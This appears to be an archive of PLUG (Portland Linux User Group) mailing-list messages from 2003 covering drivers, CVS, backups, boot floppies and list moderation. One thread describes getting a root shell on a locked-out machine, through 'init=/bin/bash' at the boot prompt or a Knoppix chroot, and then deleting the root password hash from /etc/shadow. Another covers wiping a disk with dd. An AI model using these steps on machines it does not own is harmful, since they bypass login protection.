I just used HTML.  Since you know the screen resolution and presentation 
platform you can treat it like page layout.  

My stuff was very simple, see for yourself at:

I often use the LaTeX seminar package, although when in a hurry I
usually break down and use powerpoint, or Star Office Impress.

Acrobat Reader has a nice fullscreen mode that works very well for
slides, you can do annimations/embedded video/enter effects/etc.,
though I haven't.

Example LaTeX slides at:

https://web.engr.oregonstate.edu/cgi-bin/cgiwrap/creswick/navTest/navTest.pl?page=Home/Tips/LaTeX

or,

.ps and .pdf there also.

I'm curious:  why are packet filtering options needed in /proc, when netfilter offers so much power?  For instance some iptables tutorials suggest doing this

echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all

to disable "response to ping".  There are several other similar commands.  I'm not sure exactly what they effect, but couldn't one achieve the same with iptables?

Subject: [PLUG] Leaving the List - Firewire and Linux
Message-ID: <200312011124.02930.mark@linuxhardware.net>

Greetings, 

I am leaving the Portland area (heading to Pittsburgh, PA), and therefore will 
be leaving the list.  Over the past few years I've mostly lurked, but my 
knowledge base has expanded by following many of the threads on this list.  
In that light, I thought I would take this as an opportunity to share my 
recent experience with digital video and linux and 802.11b usb wireless 
device under Linux.

I had to install a firewire PCI card to use my digital video camera with 
Linux.  I bought the cheapest one ENU inc has available, it was $26.  I don't 
know what brand it is, it just said "firewire" on the box.  I figured it was 
pretty generic, and I was right.  I has the ohci chip on it, which is well 
supported under linux.  After installing the card, I re-built my kernel with 
the IEEE1394 support enabled and the other fire-wire related options built as 
modules.

I then installed kino, (http://kino.schirmacher.de/) a digital video grabbing 
and editing program.  I plugged the camera into the computer, loaded the 
firewire module and the IEEE1394 video module, the camera was detected, fired 
up kino, and that was it, I was receiving digital video from the camera, it 
was really easy.  

This particular camera also takes still shots, I used gphoto2 to retrieve 
those with absolutely no problems, although I did have to upgrade to the 
latest version for the camera support.

Now on to the wireless.  Since I am moving, and will be temporarily staying 
with relatives, I want to be able to set my desktop up without having to fish 
wires.  So I headed to Worst Buy and bought a D-Link DW 122 usb wireless 
adapter. (It has the prism2 chip) After downloading and building the wlan-ng 
usb driver (http://www.linux-wlan.org/), I plugged the device in and loaded 
the module.  Within seconds I was on-line.  Speaking of wireless, don't buy 
the D-Link DWL520, although it doesn't say on the packaging, it needs a PCI 
2.2 slot.  However, there are reports that it works in a PCI 2.1 slot.  I 
have a 2.1 slot and it didn't work.  While researching which devices really 
do have the prism2 chip, I noticed that Linksys has been switching to the 
broadcom chip in some of their cards, if you are in the market for one of 
these, be mindful of this, as the broadcom chip is as of yet unsupported.

One this that I didn't get working, and partly because I ran out of time, was 
my Lacie 80gig firewire hard disk. IT needs the SBP-2 module, which was 
fussy.  I have reports that it does work, but I will have to wait to try it.

Message-ID: <Pine.LNX.4.56.0312011221370.6360@salmo.appl-ecosys.com>

  I'm getting my old notebook ready for sale and tried changing the password
to a give-away. Apparently, my fingers mistyped the new password the same
way twice: I cannot log in under either the new or old root password.

  So, I tried booting into single user mode. This is one a Slackware-9.1
system. At the boot prompt I type 'linux single' or 'linux 1' and it does
boot into single-user mode, but asks for a login. Sigh.

  What do I do to just get a root shell that will allow me to change root's
password? The boot loader on this box is LILO, not grub.

TIA,

Rich

The only way that I know of is to boot the box with an alternative, like
knoppix, and then delete the root password hash from the /etc/shadow
file on the hard-drive.  Don't let the knoppix GUI mount the hard-drive,
it will mount it read-only.  (Of course, the command "mount / -o rw -o
remount" will take care of the problem.)

Good Luck,

"linux init=/bin/bash rw"
will probably work.  From there it's usually easier to just edit the
password file to null out the root password.  sync your HD before
rebooting to be safe.

At the lilo prompt type:

	IMAGENAME init=/bin/bash

You'll be in as root with a bash shell.  

See:  http://www.hackinglinuxexposed.com/articles/20020702.html

for one of the many explanations.

That will work.  The other solution is to boot linux with the
init=/bin/sh boot option trick, and edit /etc/passwd or /etc/shadow as
appropriate (removing the password hash).  That will allow you to
reboot and login root without a password, which is sufficient to reset
the password to whatever you like (paying more attention this time).

One could, but these directly control the behavior of the network stack
rather than filtering stuff before it gets there.  So same effect but
much different cause.

Also, it means you can do a few basic things without loading netfilter.

Message-ID: <20031201232335.GA20663@gate.kl-ic.com>

I had a bit of a scare today, when I found that Comcast has started
blocking ping.  I have heard tales of them blocking other ports in
other regions, and I should be prepared for future buttheadedness.

Are there any commercial services that offer "static IP at one end,
VPN at the other end?"  With such a service, I could VPN out through
my comcast line, and put up my ports and an IP address to hang my
present incoming services (ping, smtp, ssh, http redirect) on.

A service that also hosted webpages, and supported CGI for perl and
wiki, would be even better.

I don't need the service now (unless it is cheap) but it would be
nice to plan in advance of need.

No need to leave the list.. I understand that it works okay in PA, too.

A tool that I have found useful for generic broadcast recording is vsound
http://www.zorg.org/vsound/
The hard disk space taken will depend on what sample rate you record at.
4 1/2 hours of cd quality will be about 4 1/2 cd's worth of data so
roughly 2.5GB. Later you could compress it using your favorite codec
into a much smaller space or burn it on a cd. You could also record
at a lower sample rate, especially if the broadcast itself is not
being done at a high bit rate.

Okay. I noted that it was held in Owen 101 so that, taken with the "name

For a really simple, low-effort way to achieve this, I would think about
the following:

Allocate 50% of each drive for the usual filesystems, software mirrored.
This protects you from hardware failure but not from accidental deletes,
programs going nuts, filesystem bugs, etc. etc.

For example, on a pair of hypothetical 40GB drives you could have half the
drive used like this:

200MB  /dev/md0 /boot
512MB  /dev/md1 <swap>
8192MB /dev/md2 /
8192MB /dev/md3 /home

The rest of the drives serves as a mirrored local to-disk backup area:

16384MB /dev/md4 /backups

I suggest setting up a script that uses "dump" to back up the mirrored
partitions to the backups area.  A sample script is attached.

The first level 0 dump should be copied to a couple tapes, a stack of
CD-Rs, or a hard drive that is removed from the system.  (Alternatively,
only allocate 25% of your disks, and make the backup area the other 75%,
but that wastes a lot of your online storage on static data.)

The level 0 backup would only be needed if a file that has not changed
since that level 0 backup was created needed to be restored.  I've never
had to do this, since I seem to only damage/delete recently created files.
However, you'll want that level 0 backup somewhere-- just in case.  (I
usually use stacks of CD-Rs for this.)

The attached backup script sample schedule never does a level 0 (full)
backup for this reason.

Easy recovery is the reason I like the dump utility.  Using "restore -i" I
can use the bash-like interface to mark the files I want restored, then
restore them.  (Because RAID provides basic protection, I'm seldom doing a
full restore.)

The "Tower of Hanoi" sequence mentioned in the script makes it a bit
harder to find the files you want restored but saves lots of disk space.
If you want a truly easy recovery, just make every backup a level 1 and
you'll never need to hunt through multiple backups to find the files you
want.

As always, do a test restore to familiarize yourself with the process so
you don't have to learn it under pressure.  Also, periodic test restores
help ensure that the backups are valid and that you've included all the
devices that should be included.

Message-ID: <20031202003202.21186.qmail@web40804.mail.yahoo.com>

What distribution are you using? I use Red Hat, and know of a few ways
to do these things.

To check your IP address settings, use the "ifconfig" command. To read
details about this command, use the "man" command like so: "man
ifconfig"

The "man" command is very useful and gives you details about just about
any command or program you can think of.

To set your IP address in Red Hat, one way is with "netconfig." You
could also manually edit your ethernet config file, which might be
something like /etc/sysconfig/network-scripts/ifcfg-eth0. You can also
set up your network with ifconfig. Again, check the man page.

I hope this helps,

-Scott

For someone who responded to a post with rants about Galeleo, you are
not the one to talk about "nuts or delusional".

I have seen comments about moderation of the list, but they were
referring to *your* posts.

Yes, Jeme can go off onto screeds.  But he does post useful technical
information.

I have never seen Carla be rude to anyone who did not deserve it.

Both provide positive technical help to this list.  I am not certain if
I can say the same for you, however.

Any discussion group will get off topic and/or inflammatory posts.  It
is a fact of life.  Get used to it. We try and shuttle those off topic
rants to the plug-talk list.  It does not always happen, however.

Being thin skinned about the process makes even *less* get done.

Another thing. Being "professional" means I also get paid.  

Get out your checkbook.

"ifconfig" is the command that does the work, however most distributions
have a tool to make life easier.

In Redhat you can type "netconfig" and get a network configuration
utility.

What distribution are you using?

Most internet broadcasts do not send at CD quality.  ("Think of the

  Thanks to all of you who reminded me of the 'init=/bin/bash' addendum to
the boot command. That's what I had forgotten (but I'll save this for the
next time).

  Frustratingly, when I was at the boot prompt I discovered that I had no
editor available to me. No vim, emacs or joe! Worse, when I tried 'ls /usr',
the shell prompt immediately returned; no listing of files or directories in
/usr.

  In retrospect, I think that I typed the new password correctly both times,
but something broke behind the scenes. Rather than futz with it (since I
really haven't the time -- my apologies to you, Russell), I'm just going to
do a fresh install of the distribution for the purchaser.

Thanks,

Rich

This sounds like a case for chroot.  Suspect that your normal filesystems 
weren't mounted and you were working with the bare minimum.  One nice thing 
RedHat does in this case is to spit out a reminder on how to do this when in 
single-user/rescue mode.

Most likely, you didn't have the /usr partition mounted as you did not 
go through the whole init cycle. However, wiping the disk and doing a 
fresh install is the more practical choice when selling a computer. I 
would probably take the additional step of doing a secure delete and 
overwriting the sectors to make sure that none of your personal data 
can be recovered. There are many utilities for doing this.  A quick 
google will find you many choices that fit on a floppy.

Okay, so netfilter works before the network stack.  Does that mean if I block pings with iptables, it's pointless to do it with /proc?

What I'm wondering is, if I'm going to use netfilter, why bother with the /proc options?  They show up in most iptables sample scripts, so there must be a reason.

I was about to SCREAM, but then read Doug Davis's reply regarding the
imminent sale context, and I am inclined to agree.  In another
context, doing a fresh install to solve such a trivial problem is so,
so, ... Microsoft!

Check out /dev/snd/ if you're using alsa, and /dev/sound/ no matter what
you're using.

With devfs, /dev/dsp is almost always a symlink to /dev/sound/dsp...

FWIW, it seems devfs is on its way out.  I gave it a shot here on my
laptop and have been sorely disappointed in it.  I see no advantages and
plenty of disadvantages.

I love Knoppix for this kind of thing, it makes it soooo easy. 

"Open a root shell on the host system
This lets you operate on the host system, as though you were logged into 
it directly. Identify the partition the host system is on, then open a 
Knoppix root shell and mount it:

root at ttyp0[knoppix]# mount /dev/hda1 /mnt/hda1
root at ttyp0[knoppix]# chroot /mnt/hda1
root at Knoppix:/ "

I've done this before, but for some reason I can't do it now.

Error is thusly,

$ cvs login
Logging in to :pserver:kyle at rufus:2401/home/cvsroot
CVS password:
/home/cvsroot: no such repository
$

/var/log/messages reports

Does it really think /home/cvsroot is a user? or it's not happy with the way 
the repository is set up?


The Facts:

Repository is /home/cvsroot

Added newgroup 'cvs', my user is in that group

$ ls -la /home/cvsroot

Did you initialize a new new repository like so?

cvs -d /home/cvsroot init

It looks like it since I see a CVSROOT directory. Also make sure you 
have entered your password correctly for the userid you are using. I 
know for my userids that access CVS I have them assigned to the cvs 
group too.

Right, init creates CVSROOT.  AFA password, I haven't set one yet.  Don't I 
need to be able to checkout CVSROOT and add a passwd file first?

Sorry I hit the send key too soon on my previous message:

Check your xinitd.d/cvspserver setup too:

server_args         = -f --allow-root=/home/cvsroot/ pserver

I think you don't want to have the trailing / and want the following 
instead: 

server_args         = -f --allow-root=/home/cvsroot pserver

Ding ding ding!  Thank you.  How pedantic of cvs...
I was also under the impression that xinetd (unlike its predecessor) didn't 
really need to be restarted because configs were read on-demand--obviously 
not the case.

The data on the drive is still very easily recoverable after that,
however.  Shoot, you could probably do it from Windows.  :-)

I feel safe after dd'ing it with zero once, then with /dev/urandom
twice.  The data on the drive is still recoverable at that point... but
it's not quite so easy to get at it and beyond the capabilities of most
folks.  If you only want to run over it once, I'd go with urandom over
zero... I would think that would help at least a little bit.

Not sure about xinetd but I do recall that the "classic" inetd process 
rereads its configuration file if you send it a SIGHUP signal.

Whoa, whoa, whoa...

seriously? How? dd in theory is supposed to write a zero to each bit of
the drive. That this leaves residual magnetic charge doesn't surprise
me, but enough that you can read it without breaking open the drive in a
sterile environment and putting its platters under some serious
inspection? And a couple /dev/urandom's does too?

Explain?

Folks in Red Hat land can use /sbin/chkconfig to manage xinetd
services, assuming that a file for that service already exists in
/etc/xinetd.d:

[heinlein]$ chkconfig --list | grep ^[[:space:]]
        chargen-udp:    off
        rsync:  off
        chargen:        off

        cups-lpd:       off
        sgi_fam:        on
        ktalk:  off

To turn on, say, time, just issue

  chkconfig time on

chkconfig will send SIGHUP to xinetd for you; check /var/log/messages
for log spew.

I know this isn't the question you asked, but I can't help recommending
arch or subversion.  Arch is dead simple to set up and much easier to
use than CVS (and much, um, more reliable in my experience).  I haven't
personally user subversion, but given that most of the developers are
also the maintainers of CVS, I'm guessing it's pretty similar but
"better."  I've never successfully set up a SVN server, however, so I
don't know.  It's also now a GNU project and at
http://www.gnu.org/software/gnu-arch/ I have spec files and RPMS if
you're using RedHat and decide to go that route.  I've replaced all of
my CVS repos with arch archives and haven't looked back.

Subject: [PLUG] bug in vim-enhanced for fedora core?
Message-ID: <20031202171330.GC28391@dalsemi.com>

I updated from RH9 to Fedora Core 1 last night, and everything went
great (except that they still haven't integrated the ethernet drivers
for the Dell Inspiron 1100 yet.)  The upgrade took about 1.5 hours.

However, I quickly noticed that in vim (from the vim-enhanced package)
the built-in perl interpreter does not seem to work anymore.  Trying
a simple command like this:

:1,$perldo 'tr/a-z/A-Z/;'

doesn't do anything, not even to generate an error message.

If any of y'all use vim, know perl and have FC1 installed, would you
mind trying this to help verify the problem?  I'll be downloading the
source RPMs to make sure that everything is configured right.

Thanks,
Colin

I've been meaning to play with those.  Just looked at the arch homepage and 
was amused to see that they keep their stuff in cvs.
http://savannah.gnu.org/cvs/?group=gnu-arch

In my case, it's just some house drawings and my dog's webpage that had 
already been under cvs control and I needed to move the repository host. 
(Haven't worked out how to convince the checked-out dirs that it's okay to 
talk to the new server just yet--just a matter of more coffee.)

Cheers,

Yeah, it's a chicken-and-egg problem ;-P It's been a while since I used
CVS so I'm not sure if there's a cvs command to do it, but I've always
found the easiest way is to edit/script CVS/Root and CVS/Repository

For one, if you have multiple interfaces, you are not going to forward
packets unless /proc/sys/net/ipv4/ip_forward is "1", regardless of what
iptables says.

It sounds like the sound module is not loaded.. did you recently
install/recompile a kernel? 

What sound card are you using, and what is the output of lsmod?

Subject: [PLUG] Emergency boot disk creation
Message-ID: <20031202185713.42054.qmail@web9606.mail.yahoo.com>

Surely you've heard this one before. One has a Linux
installation that boots from a floppy, and loses the
ssme. What's worse, this distro does not make a boot
disk as part of the installation routine.

Is it possible to make a boot disk by copying
individual files onto a floppy, and if so which ones

Certainly if someone has come up with a clear web page, I'm interested.
If I were to do one, I'd start with SYSLINUX and busybox, as a matter of
pointing you in the right directions.

I would recommend using CVS over ssh...

export CVSROOT=:ext:kyle at rufus:/home/cvsroot
export CVS_RSH=ssh

Then place your ssh public key in kyle at rufus:.ssh/authorized_keys and you're
set.

If one were to kindly provide information as to the name and version of
one's choice of distro, and some details on the boot medium used in this
particular instance, I suspect one might find help to be a bit more
forthcoming, as well as more accurately targeted to one's predicament.

It likely is, in many lovingly-created documents that invariably are
only minimally applicible to one's particular situation.  And there's
one document buried in some mail archive with the exact fix.

All that said, I'm gonna guess you used a floppy with syslinux, the
kernel and a basic boot commandline (root=/dev/hdb1 or suchlike). AFAIK
syslinux can't just be copied, it has to be installed so the floppy
knows to boot from it.

Good luck,
  Aaron

Of course good advice, but in my case the repository and workstation are

This is a toughie. It's Mandrake 9.1. It does not make
a boot disk during the installation, and if you try to
make one after booting into it, using a blank,
formatted floppy, it won't do it. The floppy already
has a filesystem, or something. Who ever heard of such
a thing? Why doesn't it just erase the disk?

That means that Mandrake put the boot loader into the
MBR, without asking anyone. Unfortunately, if you
dual-boot with Win XP, this is unacceptable. All you
have to do is to boot into XP with its CD and restore
the MBR, but Mandrake is not accessible. If I'm going
to use Mandrake 9.1, I probably need to make a boot
disk for it somehow.

Remember, I'm the dude with the Promise drive
controller. Neither Red Hat 8 nor 9 appears to work
with it properly, assigning drive device designations
such as hde and hdf. Not Mandrake: it's hda and hdb,
as it should be. Since Mandrake solves that problem,
I'm inclined to use it, if I don't have to install it
every time I want to use it.

If there is a working kernel on the HD, you should be able to boot
from a grub floppy and then boot that kernel from the interactive grub
command-line, with something like:

   root (hd0,0) 
   kernel /boot/vmlinuz-foo root=/dev/hda1
   boot

substituting the right devices and kernel filename.  Grub has device
and filename completion, so if you aren't sure what to type, hit tab
and you'll see your choices.  There are instruction for making grub
floppies online, so google is your friend there.  Basically, it is two
dd commands if you've got another working linux box.  I believe there
is a rawrite alternative if you are stuck with windows.  Ah, I found
this with a google on: grub floppy dd

It will be MUCH easier to convince the Mandrake bootloader to boot the
XP partition than trying to convince the XP bootloader to boot linux
(though not impossible, I believe that someone posted instructions for
this not too long ago).

A boot floppy is not the fix that you need for this problem.

This is normal, the kernel has to be fed the option "ide=reverse" to
change the behavior.

What is the bootloader that Mandrake uses (lilo or grub)?

I've just discovered that I do not have an app that opens my palm's
memos. 

I didn't think that it was syncing them, but it is, there's not an
apparent memo section in evolution 1.0.8.

Is there a way to make, sync and edit my palm's memo files? There's a
bunch of junk when viewed with kate, so I'm assuming that there's a
proprietary format involved to make the different memos index...

Doesn't like anyone has answered the first question correctly yet, so
naturally, "Yes".  :-)

Depends upon how functional you want the floppy to be. Absolute minimal
functionality, mainly the system loads the kernel and boots, can be
obtained with only the kernel.

fdformat /dev/fd0
cat /boot/vmlinuz > /dev/fd0

If this is a vanilla distribution kernel you may need to run `rdev` on it
first so it knows where to find the root filesystem. This doesn't load
any initial ramdisk, so it does have to have the basic drivers for your
hardware built in, but if you need it fast it does the job.

For a little more functionality, both syslinux and LILO can be placed on
floppies. For LILO:

mkfs /dev/fd0
mount /dev/fd0 /mnt/floppy
mkdir /mnt/floppy/boot /mnt/floppy/etc /mnt/floppy/dev
cp /boot/*.b /mnt/floppy/boot
cp /boot/vmlinuz /mnt/floppy/boot
cp /etc/lilo.conf /mnt/floppy/etc
mknod /mnt/floppy/dev/fd0 b 2 0
lilo -r /mnt/floppy -b /dev/fd0
umount /mnt/floppy

You might want/need to do further customization of lilo.conf, but for a
minimal installation this will work. If you're using an initial ram disk
you'll need to copy that on as well. This requires a Unix filesystem on
the floppy so LILO can talk to the device, though with some adjustment
you could work around that (hmm, might even be as easy as `mount /dev
/mnt/floppy/dev -o bind`, and then skip the `mknod`). Also note that you
can nuke floppy/dev and floppy/etc after running lilo.

Getting into Mandrake in rescue mode, I put GRUB back
into the MBR and booted Mandrake normally. Then I made
the boot disk, overwrote the MBR again, and booted
Mandrake from a floppy.

I won't say "normally," because I've never seen such a
botched-up installation. Neither of the optical drives
is accessible, and it's the only Linux installation
I've ever performed to lack sound, though the modules
are there.

Perhaps that ide=reverse business has something to it.
Should I try, say, Red Hat again, assuming that
results will be satisfactory with the kernel
parameter?

mkisofs and cdrecord?  You can pipe one into the other.

Hrm, there's gotta be a way to pipe output from tar through mkisofs to
cdrecord such that you get a tar.gz file on the CD.  Methinks I'll have
to give it a try...

% is the same as 1,$

tr/// uses $_ as the variable to operate on when no other variable is
specified.

To make tr/// use the $_ variable explicitly, you'd use the binding
operator '=~', not '='.  Using '=' makes tr/// return the number of
characters changed, not the changed variable.

Please, please, please post your results to the list when you've got it

Also, give me a holler offline and let me see if I can interest you in

There is a HOWTO... I found while I was searching for something else.

  I think not...  I suspect mkisofs will want a directory structure to base
it's ISO image.  It would be possible to use tmpfs to create a scratch
directory to work from.  You can create a tmpfs filesystem with a simple
mount command.

mount tmpfs /mnt/tmpfs -t tmpfs

Use "dump" and break the output up into 4.7GB chunks using the "-M" and
"-B" options.

Why does everyone keep recommending dump? It's very fs-specific and I
seem to recall even ext2 maintainers deprecating it, although I could be
wrong. It seems a very fragile format to back up to.

Actually, if your cvs repository is purely local, then don't bother with
pserver at all, and set your CVSROOT to either ":local:/home/cvsroot" or
just "/home/cvsroot".

Yeah, but it keeps me in practice.  I've been known to crawl upstairs and 
use a laptop.  (Not recomended for running xfig, though).  Also created a 
link /usr/local/cvs -> /home/cvsroot because I got used to looking there.

BTW, if anyone's not familiar with TkCVS, or you haven't tried it recently, 
worth a look.  Pretty easy to get running on win boxes too.

I have a WD 120 GB drive in an external FireWire enclosure, and don't
recall having had any real difficulties setting it up. Besides the 'sbp2'
module, you'll need (or at least I needed) 'raw1394' and 'ohci1394'
modules. Other than that, it pretty much just works. Since the drive is
accessed via SCSI emulation, it shows up as '/dev/sda'. One thing I've
noticed: the drive has to be powered up before 'sbp2' loads, or else it
won't get noticed (and consequently its partitions can't be mounted).

Well, I tried -graft-points first.  It works with a real file, but not
with '-' as the source filename.  But -stream-media-size looks to be an
actual (if hackish) way to do this.  Problem is, it always names the
file STREAM.IMG, won't do multisession, needs to know the size in
advance and pads the CD/DVD out to that size.  So unless the maximum
size is known in advance, a 10MB backup will take the same space and
write-time as a 700MB one.

I guess it needs to know the size of the file when it writes the ISO9660
directory info.  Who'da thunk?

And with multi-volume backups, ya dang well better label the CDs.

Yup, looks like the resulting CD would be about as cryptic as one
created by piping tar directly to cdrecord.  Difference being that you
would have to mount it before reading the tarball.

I guess you better just have a compressed backup's worth of free space
somewhere if you want useful things like informative filenames or multi-
session backup CDs.  The tmpfs idea looks good if you have enough VM.

Sorry, my thinking process involves much blathering,

Yeah, I typoed out the '~', but otherwise did you try it?  It might get 
you around the "bug" at least for now.
I note the same behaviour with gvim 6.2.29 with my Gentoo system.
Doing ":%perldo $_ =~ tr/a-z/A-Z/" gets the correct behaviour
Though I'm seeing now that it's not the "$_ =~" that's the problem, it's 
your use of single quotes.
":%perldo tr/a-z/A-Z/" works as well.

If you use DVD-RW there is a great solution that allows for resizing of
the disk, and other fun things.

http://fy.chalmers.se/~appro/linux/DVD+RW/

Is a good starting place.

I made a live backup recently.

I guess the 4000 SPAM selection to delete has done something to my 
evolution installation.  I am writing this with pine.  But I would like to 
regain my access to evolution folders.

I moved the folders out of mail into Mail.  Created a link from mail to 
Mail in my home directory, but evolution codes messages so that each has 
its own folder.

Any idaes how to unfreeze the application.  I have already reinstalled it 
and restarted it.  Still freezes at the mail icon in the startup window.

Goto hotplug.sf.net and get the latest hotplug. It solves most of these
issues automatically.

firewire has worked great since RH 7.1 for me.

It's not deprecated:

http://dump.sourceforge.net/isdumpdeprecated.html

> It seems a very fragile format to back up to.

I don't find dump fragile at all, particularly on Linux where the dump
source is readily available should I need to restore some antique CD-R 20
years from now.  Once you throw in compression, I feel that all backup
methods are pretty fragile.  This can be mitigated by using reliable media
and periodically checking the backups to see if they can be restored.

I use dump since I like the bashlike shell available in "restore -i".  It
also handles incrementals, compression, and multi-part archives easier (in
my opinion) than "tar".

W. Curtis Preston, author of the O'Reilly "UNIX Backup and Recovery" book
also recommends "dump" since it's easy to get backups done correctly with
it.  From his chapter on Native Backup and Recovery Utilities:

-----
This chapter describes the benefits and pitfalls of several utilities.
dump and restore are usually the best option if they are available. After
dump and restore, cpio has the best functionality, but it is slightly less
user friendly than its cousin tar. tar is incredibly easy to use and is
much more portable than either dump or cpio. If you have to back up raw
devices or perform remote backups with tar or cpio, dd will be your new
best friend.
-----

I never would have started using "dump" if it weren't for this book.  One
tour of a partial recovery with "restore -i" was enough for me to become a
dump believer, particularly after all the failed or partial "tar" restores
I'd done because of a misspelled or forgotten file.  Guess what?  You get
to read that whole tape all over again.  Grrr.

With "restore -i", I would just "cd" into the directory I wanted to
restore, pick the files I wanted, and go.  (Though I admit that I often
had problems restoring multi-part dumps until I started using the sleazy
"-a" flag on the restore.)

Other things I like about dump:
  + it's almost impossible to forget to include some of the
    files/directories on a filesystem
  + built-in gzip/bzip compression, and you can choose the multi-part file
    size after compression (-M -B)
  + strange files/devices/fifos/etc "just work"
  + really easy incrementals

Things I don't like about dump:
  + it's almost impossible to selectively exclude files/directories
  + on heavily written filesystems it's easier to get skipped or
    partially-backed up files than with tar/cpio. ("restore -C" will find
    this out for you)
  + it's really only useful for backups, whereas tar/cpio are useful for
    copying files, making archives, sending a file collection to someone,
    etc.

The most important thing is to DO the backups.  The method you use to get
there is far, far less important.  ;-)

Ken,

The times that my evolution has gotten stuck I've dug down in the "."
files in my home dir to find the evolution specific ones and then
moved them to another place. This causes evolution to recreate
them. You'll then probably have to recreate your account(s).

Sorry that isn't more specific but it might get you in the right
direction.

Keith

I finally did an strace on evolution and it stuck on the /tmp/orbit-kens
sockets directory.  Deleted everything in this directory. Evolution
started right up.  Still had minor problem with the selection, but
futzed with it and it finally got rid of those nasty spam.

I did try moving the Mail directory out of the way, but since it was a
sockets problem, that did not fix it.

Figure out what ports they're using (there are many ways to do this, the

Using a another tool:

If you wish to burn down output generated by an arbitrary program, you
can use:

Nice to have a decent perspective on dump, thanks. Even before you
replied (i.e., consulted Debian package description before looking like
a complete fool), I learned you could do selective recovery, which I
never knew before. :-)

I do not want to start another "The list needs moderation..."
thread, but I do want people to know that I read much, but not all,
of that thread, and unless I missed something most people seem to feel
the list(s) should remain as they are - UNMODERATED.

I agree, and I have many reasons for this opinion - most of which were
stated in other people's postings.  In particular, Eric had a good
posting on this.

Thus, I want to see the mailing list(s) remain as they are for the time
being.  However, I have been thinking about ways to make the list(s)
work better and had some point I would like to make a few changes.
Hopefully these changes wouldn't change the nature of the lists - only
make them easier to use.

For example, I would like to set the lists up, so once you are registered
for one of them, you can post to any of the lists.  I also think we should
post a digest or at least a listing of topics for each list to the main
plug list on a daily basis.  My thinking is that these changes would
encourage people to use our topical lists instead of the main list for
more things.

BTW-One way to get around the mentioned 'live fs' issue very, very
nicely is to use LVM and snapshot volumes. (Though be careful with md
devices as this can slow your system down a *lot*.)

...which as I read further is mentioned...

But it bears mentioning: If you're running a "Linux server" you have
almost no excuse not to be running LVM right now.

I like both of those ideas a lot.  I think such a thing might help cut
down on the traffic the main PLUG list gets, but make the PLUG lists, in
general, far more effective.

I wouldn't know how to set things up so once you are registered for one
list, you are able to post to all of them, but I'll bet it would be a
fairly simple thing to post a listing of topics for each list to the
main plug list daily.  Just the subject lines would due, with a counter
of the number of posts in response to the subject would work.  I'll bet
we could do such a thing very very easily with perl.  I would say bash,
but we need to remove the Re:, RE:, or re: from the subjects, and I
can't think of a simple way to do that with bash, as compared to perl.

Then again... hmmm... I could do it....

'eh, maybe later.  Not tonight.

Rob

By the way, Mailman is written in Python, which shouldn't be hard to modify.

Not to imply that I agree with this idea in the slightest...

If it's made an option that's off by default.

There is a reason I subscribe to PLUG main and not any of the other
PLUG-.*'s, and that's because I don't want to hear the crap they talk
about on them. (Not that anyone actually bothers to use them for their 
purpose, but that's another issue entirely...)

Ah, just the link I need to beat people over the head with when they

This is the truely crucial thing. Things like extra filesystem
permissions and flags (extended ACLs, ext2's immutable and other flags,
etc), also incredibly long filenames. Notably dump will handle links and
holes in files absolutely perfectly, while even GNU tar you don't have a
guarentee.

I and others have beaten on the ReiserFS folks telling them need dump,
they've kept to the excuse they need it to be explicitly sponsored, or
have one of their existing sponsors demand it before it will happen. For
the moment, this means I avoid ReiserFS.  :-(

Dump is filesystem specific, restore is dump *file* specific not
filesystem specific. You'll need a version of restore which handles the
dump file, but there is no need to restore to the same type of filesystem
the dump originated on.

Disk space is not free, particularly if you're running on no budget (not
too much load, it is reliable, no need to upgrade). Also adds more
complexity, and more potencial for bugs...


Another real option for the journalling filesystems which can perform
data-journaling would be a "journal-only" option. Instead of doing
copy-on-write below the filesystem, simply tell the filesystem to only
write to memory and the journal. If the journal overflows the filesystem
has to start revert back to writing to the filesystem, but that condition
is easy to detect and with a very large journal not /all/ that likely.

Why bother with mkisofs?  Why not just write the tar bitstream
instead?  Of course, you won't be able to mount it like an iso9660
image, but you ought to be able to read the tarball from the device.
GNU tar (which I assume you are using) even has a capacity limit
option that might let you do multiple volume backups.  Not that I've
tried it, but what does blank media cost these days?  Worth a try.

These are good ideas, Dave.  I think it would easiest to just hack
together a little python to do this because you can inherit the existing
python functions from mailman to alter the list databases.  Is my thinking
correct here?  I'm not a python feller.

Huh?!?  He's talking about making it an option that's ON by default.

You totally misunderstand, I think.  Dave is talking about making you able
to POST to those lists without subscribing to them separately... that way,
you can join those discussions whenever you like and redirect there when
necessary without going through the process of subscribing.  And in
addition to this, subject headers would be sent to PLUG in a daily summary
so that you can see if the discussions there are worth your time to
follow-up or not.

He's not suggesting that you get sent the mail from these lists without
explicitly asking for it.

Also:  Russell Senior and I had a discussion with Cooper Stevenson tonight
in Corvallis about his (Cooper's) ideas of what's wrong with PLUG and how
he would make it better.  He was eventually convinced that it would be
best to leave PLUG as it is and create a separate list that exists as a
moderated gateway to the general plug list.  He said he'd moderate it
himself and if it went unmoderated, so be it.  But basically, all posts to
and from the plug list would go to this moderated list and the moderator
would approve or deny them.  You could subscribe to this moderated list,
but your messages to the moderated list would also have to be approved or
denied by the moderator before forwarded on to the general plug list.

I personally think nobody in their right mind would take on that
moderator's job for free (mostly because of the time requirement), but I
think it answers his concerns nicely without impinging on our liberties at
all.

Well, I use all of these things and would be happy to provide the output
for you...

I went to the MWVLUG meeting in Corvallis this evening and afterwards
had a discussion of the list issues with several of those assembled.
Cooper Stevenson expressed an uneasiness about how the PLUG traffic
looks to newbies, that it might drive people away, which he didn't
want to happen.

Here's a wacky idea I had.

I made a suggestion to him for optional moderation.  That is, he
create his own mailing list that filters PLUG traffic.  Subscribers
send to (e.g.) plug-moderated and those messages get (either manually
or automatically) reposted to the main plug list, then the moderater
chooses which responses are helpful and not too scary or offensive
from plug back on to plug-moderated.

The nice thing about this arrangement is that plug remains
cooperatively anarchic as is without interruption, the folks who
thinks moderation is a good and useful idea get to offer a moderated
version and do the moderation work themselves.

In principle, subscribers could choose their own moderator:
plug-cooper-filtered, plug-michael-c-robinson-filtered, etc.

I am not sure that the software exists to do this directly, but it
doesn't look like a hard problem in principle.  One issue with mailman
would probably be the plug subscription limitation.  That is, mailman
wants list admin approval for posts from non-subscribers.  So
plug-moderated subscribers would need to be added to the approved
poster list somehow for it to work without manual intervention by the
plug list admin.

FWIW.

SCSI and RAID I can help with, kind of. Although my system startup
*used* to be far more interesting in this regard, I'm sorry.

Huh? Snapshots are copy-on-write. Perfect snapshot of filesystem state
at the given time without any additional disk usage. (Disk usage only
occurs as the filesystem is used.) No need to worry about "too much
load" *at all* on a live system. 

Plus LVM lets you expand and rearrange volumes live (of course, your
*filesystem*, not volume, will need to support expansion as well for it
